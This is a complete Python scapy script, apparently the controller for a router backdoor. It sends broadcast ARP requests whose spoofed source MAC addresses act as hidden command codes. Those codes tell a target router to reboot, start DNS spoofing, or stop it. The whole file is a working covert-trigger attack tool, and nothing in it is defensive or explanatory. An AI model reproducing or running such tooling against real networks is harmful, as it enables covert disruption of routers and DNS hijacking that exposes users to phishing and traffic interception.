import argparse
from scapy.all import ARP, Ether, sendp

LOOKUP = {
    "REBOOT": "92:F3:FD:8A:A9:AB",
    "DNS_SPOOF": "31:F5:9D:34:BE:0A",
    "UNDO_DNS_SPOOF": "51:F7:AD:44:CE:1B"
}


def send_arp_command(router_ip, iface, command):
    if command not in LOOKUP:
        print(f"[-] Unknown command: {command}")
        return

    spoofed_mac = LOOKUP[command]

    arp = ARP(op=1, pdst=router_ip, hwsrc=spoofed_mac)
    eth = Ether(dst="ff:ff:ff:ff:ff:ff")
    pkt = eth / arp

    sendp(pkt, iface=iface, verbose=True)
    print(f"[+] Command sent '{command}' using spoofed MAC: {spoofed_mac}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Send covert ARP command to router")

    parser.add_argument("command", choices=LOOKUP.keys(), help="Command to send (REBOOT, DNS_SPOOF, UNDO_DNS_SPOOF)")
    parser.add_argument("--router-ip", default="192.168.0.1", help="Target router IP address")
    parser.add_argument("--iface", required=True, help="Network interface to send packet through")

    args = parser.parse_args()

    send_arp_command(args.router_ip, args.iface, args.command)